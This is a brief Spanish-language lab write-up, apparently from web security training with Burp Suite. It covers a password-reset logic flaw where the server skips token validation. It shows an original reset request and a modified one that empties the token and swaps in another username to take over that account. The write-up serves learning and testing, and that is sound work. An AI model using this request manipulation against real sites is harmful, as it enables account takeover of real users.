# Lógica rota en reseteo de contraseña

Tags: #GestionAutenticacion #BurpSuite 

```bash 
En este lab se explota un fallo lógico crítico en el sistema de recuperación de contraseñas.

El servidor permite cambiar la contraseña sin validar el token enviado por email, lo que permite interceptar nuestra propia solicitud de cambio, eliminar el token y modificar el nombre de usuario. De este modo, se reasigna su contraseña y se toma el control total de su cuenta.
```

```bash 
# Solicitud original 
	POST /forgot-password?temp-forgot-password-token=12345
	
	temp-forgot-password-token=12345&username=omar&new-password-1=test&new-password-2=test
```

```bash 
# Solicitud modificada quitando el token para cambiar la password de otro usuario 
	POST /forgot-password?temp-forgot-password-token=
	
	temp-forgot-password-token=&username=juan&new-password-1=test&new-password-2=test
```